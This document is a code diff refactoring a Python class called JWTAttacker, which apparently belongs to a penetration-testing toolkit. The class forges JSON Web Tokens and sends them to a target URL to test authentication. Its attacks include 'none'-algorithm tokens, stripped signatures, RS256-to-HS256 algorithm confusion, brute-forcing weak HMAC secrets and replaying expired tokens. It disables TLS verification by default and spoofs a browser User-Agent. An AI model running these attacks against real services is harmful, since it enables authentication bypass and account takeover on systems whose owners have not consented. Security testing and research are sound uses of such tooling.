@@ -15,11 +15,11 @@ import base64
 import hashlib
 import hmac
 import time
-from typing import Dict, List, Any, Optional, Tuple
+from typing import Dict, List, Any, Optional, Tuple, Union
 from dataclasses import dataclass, field
 
 import requests
-from requests.exceptions import RequestException
+from requests.exceptions import RequestException, Timeout, ConnectionError
 
 
 @dataclass
@@ -63,14 +63,115 @@ class JWTAttacker:
             target: Target URL
             config: Configuration dictionary
         """
-        self.target = target
+        self.target = target if target else ''
         self.config = config or {}
         self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        })
         
         self.timeout = self.config.get('timeout', 30)
         self.verify_ssl = self.config.get('verify_ssl', False)
         self.results: List[JWTResult] = []
         self.errors: List[str] = []
+        self.scan_status: str = 'initialized'
+    
+    def _ensure_bytes(self, data: Union[str, bytes]) -> bytes:
+        """
+        Ensure data is in bytes format.
+        
+        Args:
+            data: String or bytes
+            
+        Returns:
+            Bytes representation
+        """
+        if isinstance(data, str):
+            return data.encode('utf-8')
+        return data
+    
+    def _normalize_secret(self, secret: Union[str, bytes]) -> bytes:
+        """
+        Normalize secret to bytes for HMAC operations.
+        
+        Args:
+            secret: Secret string or bytes
+            
+        Returns:
+            Bytes secret
+        """
+        return self._ensure_bytes(secret)
+    
+    def _safe_b64_decode(self, data: str) -> Optional[bytes]:
+        """
+        Safely decode base64 with padding handling.
+        
+        Args:
+            data: Base64 encoded string
+            
+        Returns:
+            Decoded bytes or None
+        """
+        try:
+            # Add padding if needed
+            padding = 4 - (len(data) % 4)
+            if padding != 4:
+                data += '=' * padding
+            return base64.urlsafe_b64decode(data)
+        except (base64.binascii.Error, ValueError, TypeError):
+            return None
+    
+    def _validate_token(self, token: str) -> Tuple[bool, str]:
+        """
+        Validate JWT token format.
+        
+        Args:
+            token: JWT token string
+            
+        Returns:
+            Tuple of (is_valid, error_message)
+        """
+        if not token:
+            return False, "Token is empty"
+        
+        parts = token.split('.')
+        
+        if len(parts) != 3:
+            return False, f"Invalid token format: expected 3 parts, got {len(parts)}"
+        
+        for part in parts[:2]:
+            if not part:
+                return False, "Empty token part found"
+        
+        return True, ""
+    
+    def _get_algorithm(self, header: Dict[str, Any]) -> str:
+        """
+        Safely get algorithm from header.
+        
+        Args:
+            header: JWT header
+            
+        Returns:
+            Algorithm string
+        """
+        return header.get('alg', 'unknown')
+    
+    def _check_response_valid(self, response: Optional[requests.Response]) -> bool:
+        """
+        Check if response is valid.
+        
+        Args:
+            response: HTTP response
+            
+        Returns:
+            True if response is valid
+        """
+        if response is None:
+            return False
+        if not hasattr(response, 'status_code'):
+            return False
+        return True
     
     def decode_jwt(self, token: str) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
         """
@@ -81,18 +182,24 @@ class JWTAttacker:
             
         Returns:
             Tuple of (header, payload, signature)
+            
+        Raises:
+            ValueError: If token format is invalid
         """
+        # Validate token first
+        valid, error = self._validate_token(token)
+        if not valid:
+            raise ValueError(error)
+        
         parts = token.split('.')
         
-        if len(parts) != 3:
-            raise ValueError("Invalid JWT token format")
-        
         def decode_part(part: str) -> Dict[str, Any]:
-            padded = part + '=' * (4 - len(part) % 4)
+            decoded_bytes = self._safe_b64_decode(part)
+            if decoded_bytes is None:
+                return {}
             try:
-                decoded = base64.urlsafe_b64decode(padded)
-                return json.loads(decoded)
-            except Exception:
+                return json.loads(decoded_bytes.decode('utf-8'))
+            except (json.JSONDecodeError, UnicodeDecodeError):
                 return {}
         
         header = decode_part(parts[0])
@@ -101,32 +208,62 @@ class JWTAttacker:
         
         return header, payload, signature
     
-    def encode_jwt(self, header: Dict[str, Any], payload: Dict[str, Any], secret: str = '') -> str:
+    def _encode_part(self, data: Dict[str, Any]) -> str:
+        """
+        Encode a JWT part.
+        
+        Args:
+            data: Dictionary to encode
+            
+        Returns:
+            Base64 encoded string
+        """
+        try:
+            json_str = json.dumps(data, separators=(',', ':'))
+            return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()
+        except (TypeError, ValueError):
+            return ''
+    
+    def encode_jwt(
+        self,
+        header: Dict[str, Any],
+        payload: Dict[str, Any],
+        secret: Union[str, bytes] = ''
+    ) -> str:
         """
         Encode a JWT token.
         
         Args:
             header: JWT header
             payload: JWT payload
-            secret: Signing secret
+            secret: Signing secret (string or bytes)
             
         Returns:
             Encoded JWT string
         """
-        def encode_part(data: Dict[str, Any]) -> str:
-            json_str = json.dumps(data, separators=(',', ':'))
-            return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()
+        header_b64 = self._encode_part(header)
+        payload_b64 = self._encode_part(payload)
         
-        header_b64 = encode_part(header)
-        payload_b64 = encode_part(payload)
+        if not header_b64 or not payload_b64:
+            return f"{header_b64}.{payload_b64}."
         
         if secret:
-            algorithm = header.get('alg', 'HS256')
+            algorithm = self._get_algorithm(header)
             
             if algorithm.startswith('HS'):
-                hash_func = hashlib.sha256 if '256' in algorithm else hashlib.sha384 if '384' in algorithm else hashlib.sha512
+                # Normalize secret to bytes
+                secret_bytes = self._normalize_secret(secret)
                 message = f"{header_b64}.{payload_b64}".encode()
-                signature = hmac.new(secret.encode(), message, hash_func).digest()
+                
+                # Choose hash function based on algorithm
+                if '384' in algorithm:
+                    hash_func = hashlib.sha384
+                elif '512' in algorithm:
+                    hash_func = hashlib.sha512
+                else:
+                    hash_func = hashlib.sha256
+                
+                signature = hmac.new(secret_bytes, message, hash_func).digest()
                 signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
                 return f"{header_b64}.{payload_b64}.{signature_b64}"
         
@@ -150,17 +287,21 @@ class JWTAttacker:
             
             modified_token = self.encode_jwt(none_header, payload)
             
-            test_url = f"{self.target}"
-            headers = {'Authorization': f'Bearer {modified_token}'}
-            
-            response = self.session.get(
-                test_url,
-                headers=headers,
-                timeout=self.timeout,
-                verify=self.verify_ssl
-            )
-            
-            vulnerable = response.status_code == 200
+            vulnerable = False
+            if self.target:
+                test_url = self.target
+                headers = {'Authorization': f'Bearer {modified_token}'}
+                
+                try:
+                    response = self.session.get(
+                        test_url,
+                        headers=headers,
+                        timeout=self.timeout,
+                        verify=self.verify_ssl
+                    )
+                    vulnerable = response.status_code == 200
+                except RequestException:
+                    pass
             
             result = JWTResult(
                 token=token,
@@ -206,39 +347,42 @@ class JWTAttacker:
         try:
             header, payload, signature = self.decode_jwt(token)
             
-            if header.get('alg', '').startswith('RS'):
+            if header.get('alg', '').startswith('RS') and public_key:
                 confused_header = header.copy()
                 confused_header['alg'] = 'HS256'
                 
-                if public_key:
-                    modified_token = self.encode_jwt(confused_header, payload, public_key)
-                    
-                    test_url = f"{self.target}"
+                modified_token = self.encode_jwt(confused_header, payload, public_key)
+                
+                vulnerable = False
+                if self.target:
+                    test_url = self.target
                     headers = {'Authorization': f'Bearer {modified_token}'}
                     
-                    response = self.session.get(
-                        test_url,
-                        headers=headers,
-                        timeout=self.timeout,
-                        verify=self.verify_ssl
-                    )
-                    
-                    vulnerable = response.status_code == 200
-                    
-                    result = JWTResult(
-                        token=token,
-                        attack_type='Algorithm Confusion',
-                        algorithm='HS256',
-                        header=header,
-                        payload=payload,
-                        signature=signature,
-                        vulnerable=vulnerable,
-                        modified_token=modified_token if vulnerable else None,
-                        description='RS256 token accepted with HS256 algorithm using public key'
-                    )
-                    
-                    self.results.append(result)
-                    return result
+                    try:
+                        response = self.session.get(
+                            test_url,
+                            headers=headers,
+                            timeout=self.timeout,
+                            verify=self.verify_ssl
+                        )
+                        vulnerable = response.status_code == 200
+                    except RequestException:
+                        pass
+                
+                result = JWTResult(
+                    token=token,
+                    attack_type='Algorithm Confusion',
+                    algorithm='HS256',
+                    header=header,
+                    payload=payload,
+                    signature=signature,
+                    vulnerable=vulnerable,
+                    modified_token=modified_token if vulnerable else None,
+                    description='RS256 token accepted with HS256 algorithm using public key'
+                )
+                
+                self.results.append(result)
+                return result
             
         except Exception as e:
             self.errors.append(f"Algorithm confusion attack failed: {str(e)}")
@@ -270,17 +414,21 @@ class JWTAttacker:
             
             modified_token = f"{token.rsplit('.', 1)[0]}."
             
-            test_url = f"{self.target}"
-            headers = {'Authorization': f'Bearer {modified_token}'}
-            
-            response = self.session.get(
-                test_url,
-                headers=headers,
-                timeout=self.timeout,
-                verify=self.verify_ssl
-            )
-            
-            vulnerable = response.status_code == 200
+            vulnerable = False
+            if self.target:
+                test_url = self.target
+                headers = {'Authorization': f'Bearer {modified_token}'}
+                
+                try:
+                    response = self.session.get(
+                        test_url,
+                        headers=headers,
+                        timeout=self.timeout,
+                        verify=self.verify_ssl
+                    )
+                    vulnerable = response.status_code == 200
+                except RequestException:
+                    pass
             
             result = JWTResult(
                 token=token,
@@ -330,16 +478,22 @@ class JWTAttacker:
             if not algorithm.startswith('HS'):
                 return None
             
+            # Try to decode signature
+            signature_bytes = self._safe_b64_decode(signature)
+            if signature_bytes is None:
+                return None
+            
             message = f"{token.split('.')[0]}.{token.split('.')[1]}".encode()
-            signature_bytes = base64.urlsafe_b64decode(signature + '==')
             
             for secret in self.COMMON_SECRETS:
+                secret_bytes = self._normalize_secret(secret)
+                
                 if algorithm == 'HS256':
-                    computed = hmac.new(secret.encode(), message, hashlib.sha256).digest()
+                    computed = hmac.new(secret_bytes, message, hashlib.sha256).digest()
                 elif algorithm == 'HS384':
-                    computed = hmac.new(secret.encode(), message, hashlib.sha384).digest()
+                    computed = hmac.new(secret_bytes, message, hashlib.sha384).digest()
                 elif algorithm == 'HS512':
-                    computed = hmac.new(secret.encode(), message, hashlib.sha512).digest()
+                    computed = hmac.new(secret_bytes, message, hashlib.sha512).digest()
                 else:
                     continue
                 
@@ -383,17 +537,21 @@ class JWTAttacker:
                 
                 modified_token = self.encode_jwt(header, expired_payload)
                 
-                test_url = f"{self.target}"
-                headers = {'Authorization': f'Bearer {modified_token}'}
-                
-                response = self.session.get(
-                    test_url,
-                    headers=headers,
-                    timeout=self.timeout,
-                    verify=self.verify_ssl
-                )
-                
-                vulnerable = response.status_code == 200
+                vulnerable = False
+                if self.target:
+                    test_url = self.target
+                    headers = {'Authorization': f'Bearer {modified_token}'}
+                    
+                    try:
+                        response = self.session.get(
+                            test_url,
+                            headers=headers,
+                            timeout=self.timeout,
+                            verify=self.verify_ssl
+                        )
+                        vulnerable = response.status_code == 200
+                    except RequestException:
+                        pass
                 
                 result = JWTResult(
                     token=token,
@@ -467,10 +625,11 @@ class JWTAttacker:
                 'signature_length': len(signature),
                 'has_expiration': 'exp' in payload,
                 'issues': issues,
+                'is_valid_format': True,
             }
             
         except Exception as e:
-            return {'error': str(e)}
+            return {'error': str(e), 'is_valid_format': False}
     
     def run(self, token: str, public_key: Optional[str] = None) -> Dict[str, Any]:
         """
@@ -483,8 +642,29 @@ class JWTAttacker:
         Returns:
             Dictionary with attack results
         """
+        # Reset state
+        self.results.clear()
+        self.errors.clear()
+        self.scan_status = 'running'
+        
+        # Validate token
+        valid, error = self._validate_token(token)
+        if not valid:
+            self.errors.append(error)
+            self.scan_status = 'failed'
+            return {
+                'findings': [],
+                'errors': self.errors,
+                'token_analysis': {'error': error, 'is_valid_format': False},
+                'attacks_performed': 0,
+                'vulnerabilities_found': 0,
+                'scan_status': 'failed',
+            }
+        
+        # Analyze token
         analysis = self.analyze_token(token)
         
+        # Run attacks
         self.test_none_algorithm(token)
         self.test_signature_bypass(token)
         self.test_weak_secret(token)
@@ -492,6 +672,8 @@ class JWTAttacker:
         
         if public_key:
             self.test_algorithm_confusion(token, public_key)
+        
+        self.scan_status = 'completed'
         
         findings = []
         for result in self.results:
@@ -511,4 +693,5 @@ class JWTAttacker:
             'token_analysis': analysis,
             'attacks_performed': len(self.results),
             'vulnerabilities_found': len(findings),
+            'scan_status': self.scan_status,
         }
